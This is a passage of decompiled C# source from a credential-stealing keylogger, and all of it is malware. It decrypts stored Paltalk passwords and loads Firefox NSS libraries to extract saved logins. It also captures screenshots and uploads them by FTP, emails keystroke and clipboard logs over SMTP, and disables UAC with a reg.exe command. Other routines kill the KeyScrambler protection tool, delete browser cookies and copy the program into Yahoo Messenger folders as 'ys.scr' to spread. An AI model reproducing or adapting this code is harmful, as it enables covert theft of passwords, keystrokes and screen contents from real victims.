							goto IL_005a;
						case 8:
							goto IL_005c;
						case 9:
							goto IL_0066;
						case 10:
							goto IL_007c;
						case 11:
							goto IL_0099;
						case 12:
							goto IL_00b2;
						case 13:
						case 14:
						case 15:
							goto IL_00ca;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00ca:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_0076;
					IL_0007:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0016;
					IL_0016:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_001e;
					IL_001e:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
					goto IL_003a;
					IL_003a:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_0055;
					IL_0055:
					num = 6;
					num5 = 0;
					goto IL_005a;
					IL_005a:
					num = 7;
					goto IL_005c;
					IL_005c:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_0066;
					IL_0066:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_0076;
					IL_0076:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_007c;
					IL_007c:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_0099;
					}
					goto IL_00ca;
					IL_0099:
					num = 11;
					if (!File.Exists(directories[num5] + "\\ys.scr"))
					{
						goto IL_00b2;
					}
					goto IL_00ca;
					IL_00b2:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\ys.scr");
					goto IL_00ca;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 304;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_88(Form1 form1_0)
	{
		char[] array = Class34.smethod_23(form1_0).ToCharArray();
		RegistryKey currentUser = Registry.CurrentUser;
		currentUser = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
		string[] subKeyNames = currentUser.GetSubKeyNames();
		currentUser.Close();
		string[] array2 = subKeyNames;
		checked
		{
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			foreach (string text in array2)
			{
				string text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text, "pwd", ""));
				char[] array3 = text2.ToCharArray();
				string[] array4 = new string[(int)Math.Round((double)text2.Length / 4.0) + 1];
				while (num <= Information.UBound((Array)array3, 1) - 4)
				{
					if (num < Information.UBound((Array)array3, 1) - 4)
					{
						array4[num2] = Conversions.ToString(array3[num]) + Conversions.ToString(array3[num + 1]) + Conversions.ToString(array3[num + 2]);
					}
					num += 4;
					num2++;
				}
				string text3 = "";
				string text4 = text;
				int j = 0;
				for (int length = text4.Length; j < length; j++)
				{
					char c = text4[j];
					text3 += Conversions.ToString(c);
					if (num3 <= Information.UBound((Array)array, 1))
					{
						text3 += Conversions.ToString(array[num3]);
					}
					num3++;
				}
				text3 = text3 + text3 + text3;
				char[] array5 = text3.ToCharArray();
				string text5 = "";
				text5 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text3.Substring(text3.Length - 1, 1)))));
				int num4 = Information.UBound((Array)array4, 1);
				for (int k = 1; k <= num4; k++)
				{
					if (array4[k] != null)
					{
						char c2 = Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[k]) - (double)k - (double)Strings.Asc(array5[k - 1]) - 122.0));
						text5 += Conversions.ToString(c2);
					}
				}
				form1_0.string_48 = form1_0.string_48 + "+-----------PalTask Passwords----------+" + Environment.NewLine + "Username: " + text + "\r\nPassword: " + text5 + "\r\n------------------";
				form1_0.vmethod_6().set_Text(form1_0.string_48);
			}
			return form1_0.string_48;
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int NextIdentity(int int_0, ref IntPtr intptr_0);

	[DllImport("sqlite3")]
	static extern int sqlite3_column_int(IntPtr intptr_0, int int_0);

	static long smethod_89(bool bool_0, long long_0, long long_1)
	{
		IntPtr procAddress = Class34.GetProcAddress(Class21.intptr_0, "PK11_Authenticate");
		Class21.Delegate5 @delegate = (Class21.Delegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class21.Delegate5));
		return @delegate(long_1, bool_0, long_0);
	}

	static void smethod_90(Form1 form1_0)
	{
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Expected O, but got Unknown
		form1_0.vmethod_104().set_Text("screeshot " + form1_0.vmethod_96().get_Text());
		form1_0.vmethod_94().set_Text(form1_0.string_45 + "\\ScreenShot " + form1_0.vmethod_96().get_Text() + " On " + ((ServerComputer)Class1.smethod_0()).get_Name() + " 's Computer " + form1_0.string_72 + ".jpeg");
		Size size = new Size(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Point point = new Point(0, 0);
		Point point2 = new Point(0, 0);
		val2.CopyFromScreen(point, point2, size);
		((Image)val).Save(form1_0.vmethod_94().get_Text());
		form1_0.vmethod_116().set_Text(form1_0.vmethod_94().get_Text());
		Thread.Sleep(1000);
		form1_0.vmethod_104().set_Text("_______________Uploadding image");
		string text = form1_0.vmethod_4().get_Text();
		string text2 = form1_0.vmethod_2().get_Text();
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + form1_0.vmethod_0().get_Text() + "/" + form1_0.vmethod_12().get_Text() + "/Screenlogger On " + ((ServerComputer)Class1.smethod_0()).get_Name() + "At" + form1_0.string_72 + "Screenshot  " + form1_0.vmethod_96().get_Text() + " .jpeg");
		ftpWebRequest.Credentials = new NetworkCredential(text, text2);
		ftpWebRequest.Method = "STOR";
		byte[] array = File.ReadAllBytes(form1_0.vmethod_94().get_Text());
		Stream requestStream = ftpWebRequest.GetRequestStream();
		requestStream.Write(array, 0, array.Length);
		requestStream.Close();
		requestStream.Dispose();
		Label val3 = form1_0.vmethod_96();
		val3.set_Text(Conversions.ToString(Conversions.ToDouble(val3.get_Text()) + 1.0));
		Class34.smethod_124(form1_0);
	}

	static byte[] smethod_91(string string_0)
	{
		IntPtr moduleHandleA = Class34.GetModuleHandleA(ref string_0);
		IntPtr intptr_ = Class34.FindResource(moduleHandleA, "0", "RT_RCDATA");
		IntPtr source = Class34.LoadResource(moduleHandleA, intptr_);
		int num = Class34.SizeofResource(moduleHandleA, intptr_);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(source, array, 0, num);
		return array;
	}

	static Class41.Class45 smethod_92(Class41.Class46 class46_0)
	{
		byte[] array = new byte[class46_0.int_3];
		Array.Copy(class46_0.byte_1, 0, array, 0, class46_0.int_3);
		return new Class41.Class45(array);
	}

	static string smethod_93(Class12 class12_0)
	{
		return class12_0.string_0;
	}

	[DllImport("sqlite3")]
	static extern IntPtr sqlite3_column_name(IntPtr intptr_0, int int_0);

	static void smethod_94(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				Interaction.Shell("C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_95(bool bool_0, Form1 form1_0)
	{
		if (!bool_0)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)Class1.smethod_0()).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("cookie"))
				{
					try
					{
						((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static void smethod_96(Form1 form1_0)
	{
		form1_0.vmethod_104().set_Text("Logs + ClipboarLogger");
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress(form1_0.vmethod_4().get_Text());
		mailMessage.To.Add(form1_0.vmethod_0().get_Text());
		mailMessage.Subject = "+Ultimate Keylogger" + ((ServerComputer)Class1.smethod_0()).get_Name().ToString() + "At " + Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Clock().get_LocalTime());
		mailMessage.Body = "ComputerInformation" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_128().get_Text() + form1_0.string_61 + form1_0.string_61 + "Installed Software" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_100().get_Text() + form1_0.string_61 + form1_0.string_61 + "Logs" + form1_0.string_61 + form1_0.string_61 + form1_0.vmethod_6().get_Text() + form1_0.string_61 + form1_0.string_61 + "ClipBoard Logs" + form1_0.string_61 + form1_0.string_60 + form1_0.string_61 + form1_0.string_61 + form1_0.string_61 + form1_0.string_62;
		Attachment item = new Attachment(form1_0.string_63);
		mailMessage.Attachments.Add(item);
		SmtpClient smtpClient = new SmtpClient(form1_0.vmethod_14().get_Text());
		smtpClient.Port = Conversions.ToInteger(form1_0.vmethod_16().get_Text());
		smtpClient.Credentials = new NetworkCredential(form1_0.vmethod_4().get_Text(), form1_0.vmethod_2().get_Text());
		smtpClient.EnableSsl = true;
		smtpClient.Send(mailMessage);
		((TextBoxBase)form1_0.vmethod_6()).Clear();
	}

	static int smethod_97(Class41.Class44 class44_0)
	{
		return 32768 - class44_0.int_1;
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int Initialize(ref Guid guid_0, int int_0, int int_1);

	[DllImport("sqlite3")]
	static extern int sqlite3_column_type(IntPtr intptr_0, int int_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FileTimeToSystemTime(ref Class9.Struct4 struct4_0, ref Class9.Struct3 struct3_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

	static void smethod_98(Form1 form1_0)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ManagementObjectSearcher val = default(ManagementObjectSearcher);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		ManagementObject val2 = default(ManagementObject);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 139:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0032;
						case 5:
							goto IL_004b;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004b:
					num = 5;
					goto IL_004e;
					IL_0007:
					num = 2;
					val = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
					goto IL_0015;
					IL_0015:
					num = 3;
					enumerator = val.Get().GetEnumerator();
					goto IL_004e;
					IL_004e:
					if (enumerator.MoveNext())
					{
						val2 = (ManagementObject)enumerator.get_Current();
						goto IL_0032;
					}
					((IDisposable)enumerator)?.Dispose();
					goto end_IL_0000_2;
					IL_0032:
					num = 4;
					form1_0.string_64 = ((ManagementBaseObject)val2).get_Item("Manufacturer").ToString();
					goto IL_004b;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 139;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_99(Class29 class29_0, IntPtr intptr_0, ref DataTable dataTable_0)
	{
		int num = Class34.sqlite3_column_count(intptr_0);
		int num2 = 0;
		checked
		{
			object[] array = new object[num - 1 + 1];
			int num3 = num - 1;
			for (int i = 0; i <= num3; i++)
			{
				switch (Class34.sqlite3_column_type(intptr_0, i))
				{
				default:
					array[i] = "";
					break;
				case 1:
					array[i] = Class34.sqlite3_column_int(intptr_0, i);
					break;
				case 2:
					array[i] = Class34.sqlite3_column_double(intptr_0, i);
					break;
				case 3:
					array[i] = Class34.smethod_103(class29_0, Class34.sqlite3_column_text(intptr_0, i));
					break;
				case 4:
					array[i] = Class34.smethod_103(class29_0, Class34.sqlite3_column_blob(intptr_0, i));
					break;
				}
			}
			dataTable_0.Rows.Add(array);
			return Class34.sqlite3_step(intptr_0);
		}
	}

	static long smethod_100(string string_0)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		Class34.LoadLibrary(text + "mozcrt19.dll");
		Class34.LoadLibrary(text + "nspr4.dll");
		Class34.LoadLibrary(text + "plc4.dll");
		Class34.LoadLibrary(text + "plds4.dll");
		Class34.LoadLibrary(text + "ssutil3.dll");
		Class34.LoadLibrary(text + "sqlite3.dll");
		Class34.LoadLibrary(text + "nssutil3.dll");
		Class34.LoadLibrary(text + "softokn3.dll");
		Class21.intptr_0 = Class34.LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = Class34.GetProcAddress(Class21.intptr_0, "NSS_Init");
		Class21.Delegate3 @delegate = (Class21.Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class21.Delegate3));
		return @delegate(string_0);
	}

	static bool smethod_101(Class41.Class42 class42_0)
	{
		switch (class42_0.int_4)
		{
		case 2:
		{
			if (class42_0.bool_0)
			{
				class42_0.int_4 = 12;
				return false;
			}
			int num = Class34.smethod_58(class42_0.class43_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class34.smethod_56(class42_0.class43_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class42_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class34.smethod_64(class42_0.class43_0);
				class42_0.int_4 = 3;
				break;
			case 1:
				class42_0.class45_0 = Class41.Class45.class45_0;
				class42_0.class45_1 = Class41.Class45.class45_1;
				class42_0.int_4 = 7;
				break;
			case 2:
				class42_0.class46_0 = new Class41.Class46();
				class42_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class42_0.int_8 = Class34.smethod_58(class42_0.class43_0, 16)) < 0)
			{
				return false;
			}
			Class34.smethod_56(class42_0.class43_0, 16);
			class42_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class34.smethod_58(class42_0.class43_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class34.smethod_56(class42_0.class43_0, 16);
			class42_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class34.smethod_61(class42_0.class44_0, class42_0.class43_0, class42_0.int_8);
			class42_0.int_8 -= num3;
			if (class42_0.int_8 == 0)
			{
				class42_0.int_4 = 2;
				return true;
			}
			return !Class34.smethod_156(class42_0.class43_0);
		}
		case 6:
			if (!Class34.smethod_81(class42_0.class46_0, class42_0.class43_0))
			{
				return false;
			}
			class42_0.class45_0 = Class34.smethod_92(class42_0.class46_0);
			class42_0.class45_1 = Class34.smethod_28(class42_0.class46_0);
			class42_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class34.smethod_115(class42_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static string smethod_102(ref string string_0, Class10 class10_0)
	{
		byte[] array = new byte[256];
		if (class10_0.byte_0.Length == 0)
		{
			class10_0.byte_0 = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
		}
		int num = 0;
		checked
		{
			do
			{
				array[num] = 64;
				num++;
			}
			while (num <= 255);
			num = 0;
			do
			{
				array[class10_0.byte_0[num]] = (byte)num;
				num++;
			}
			while (num <= 63);
			int num2 = Strings.Len(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes(string_0);
			byte[] array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[unchecked(num2 / 4) * 3 - 1 + 1]);
			int num3 = Information.UBound((Array)bytes, 1);
			int num4 = default(int);
			for (num = 0; num <= num3; num += 4)
			{
				array2[num4] = (byte)((unchecked((int)array[bytes[num]]) * 4) | unchecked((int)array[bytes[checked(num + 1)]] / 16));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 1]] & 0xF) * 16) | unchecked((int)array[bytes[checked(num + 2)]] / 4));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 2]] & 3) * 64) | array[bytes[num + 3]]);
				num4++;
			}
			num4 = ((bytes[num2 - 2] == 61) ? 2 : ((bytes[num2 - 1] == 61) ? 1 : 0));
			array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[Information.UBound((Array)array2, 1) - num4 + 1]);
			return Encoding.ASCII.GetString(array2);
		}
	}

	static string smethod_103(Class29 class29_0, IntPtr intptr_0)
	{
		if (intptr_0 == IntPtr.Zero)
		{
			return null;
		}
		Encoding uTF = Encoding.UTF8;
		int num = Class34.smethod_53(intptr_0, class29_0);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(intptr_0, array, 0, num);
		return uTF.GetString(array, 0, num);
	}

	static void smethod_104()
	{
		string string_ = "VMDragDetectWndClass";
		string string_2 = null;
		long num = Class34.FindWindowA(ref string_, ref string_2);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	static string smethod_105(ref byte[] byte_0, Class9 class9_0)
	{
		checked
		{
			byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[byte_0.Length + 1 + 1]);
			byte[] array = SHA1.Create().ComputeHash(byte_0);
			string text = "";
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += Strings.Right("00" + Conversion.Hex(array[i]), 2);
			}
			return text;
		}
	}

	static string smethod_106(string string_0, string string_1)
	{
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = string_1.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = string_1.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= string_0.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = string_0.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	static void smethod_107(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "keyscrambler", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static ICryptoTransform smethod_108(byte[] byte_0, byte[] byte_1, bool bool_0, Class39 class39_0)
	{
		class39_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class39_0.object_0, new object[1] { byte_1 });
		class39_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class39_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class39_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class39_0.object_0, new object[0]);
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegCloseKey", ExactSpelling = true, SetLastError = true)]
	static extern int RegCloseKey_1(int int_0);

	static string smethod_109(string string_0, Form1 form1_0)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		string_0 = Strings.Replace(string_0, "\\", "\\\\", 1, -1, (CompareMethod)0);
		ObjectQuery val = new ObjectQuery("ASSOCIATORS OF {Win32_DiskDrive.DeviceID=\"" + string_0 + "\"} WHERE AssocClass = Win32_DiskDriveToDiskPartition");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val2.Get().GetEnumerator();
			ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				ObjectQuery val4 = new ObjectQuery(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ASSOCIATORS OF {Win32_DiskPartition.DeviceID=\"", ((ManagementBaseObject)val3).get_Item("DeviceID")), (object)"\"} WHERE AssocClass = Win32_LogicalDiskToPartition")));
				ManagementObjectSearcher val5 = new ManagementObjectSearcher(val4);
				try
				{
					enumerator2 = val5.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val6 = (ManagementObject)enumerator2.get_Current();
						form1_0.string_75 = Conversions.ToString(Operators.ConcatenateObject((object)form1_0.string_75, Operators.ConcatenateObject(((ManagementBaseObject)val6).get_Item("Name"), (object)",")));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return form1_0.string_75.Trim(new char[1] { ',' });
	}

	static byte smethod_110(Class9 class9_0, ref string string_0)
	{
		int num = 0;
		int num2 = Strings.Len(string_0);
		checked
		{
			for (int i = 1; i <= num2; i += 2)
			{
				num += (int)Math.Round(Conversion.Val("&H" + Strings.Mid(string_0, i, 2)));
			}
			return (byte)unchecked(num % 256);
		}
	}

	static void smethod_111(Form1 form1_0)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val.Get().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				form1_0.string_65 = current.get_Item("Manufacturer").ToString();
				form1_0.string_66 = current.get_Item("Product").ToString();
				form1_0.string_67 = current.get_Item("SerialNumber").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	static extern int CredEnumerateW_1([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1, ref IntPtr intptr_0);

	static void smethod_112(Class16 class16_0, string string_0)
	{
		Class16.Struct12 @struct = default(Class16.Struct12);
		int num = Strings.Len((object)@struct);
		Class16.Struct10 struct2 = default(Class16.Struct10);
		Strings.Len((object)struct2);
		Class14 class14_ = class16_0.class14_0;
		Guid guid_ = class16_0.guid_0;
		Guid guid_2 = class16_0.guid_0;
		string string_ = string_0 + ":StringData";
		byte[] value = Class34.smethod_155(guid_, class14_, guid_2, string_);
		class14_ = class16_0.class14_0;
		guid_ = class16_0.guid_0;
		guid_2 = class16_0.guid_0;
		string_ = string_0 + ":StringIndex";
		byte[] value2 = Class34.smethod_155(guid_, class14_, guid_2, string_);
		GCHandle gCHandle = GCHandle.Alloc(value2, GCHandleType.Pinned);
		IntPtr intPtr = gCHandle.AddrOfPinnedObject();
		object? obj = Marshal.PtrToStructure(intPtr, struct2.GetType());
		Class16.Struct10 struct3 = default(Class16.Struct10);
		struct2 = ((obj != null) ? ((Class16.Struct10)obj) : struct3);
		gCHandle.Free();
		gCHandle = GCHandle.Alloc(value, GCHandleType.Pinned);
		GCHandle gCHandle2 = GCHandle.Alloc(value2, GCHandleType.Pinned);
		IntPtr intPtr2 = gCHandle.AddrOfPinnedObject();
		checked
		{
			intPtr = new IntPtr(gCHandle2.AddrOfPinnedObject().ToInt32() + struct2.int_1);
			Class16.Struct12 struct4 = default(Class16.Struct12);
			if (struct2.int_4 == 1)
			{
				if (struct2.int_2 >= 2)
				{
					int num2 = struct2.int_2 - 1;
					for (int i = 0; i <= num2; i += 2)
					{
						if (!((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero)))
						{
							object? obj2 = Marshal.PtrToStructure(intPtr, @struct.GetType());
							@struct = ((obj2 != null) ? ((Class16.Struct12)obj2) : struct4);
							IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
							string string_2;
							if (Class34.lstrlenA(intptr_) != @struct.int_1)
							{
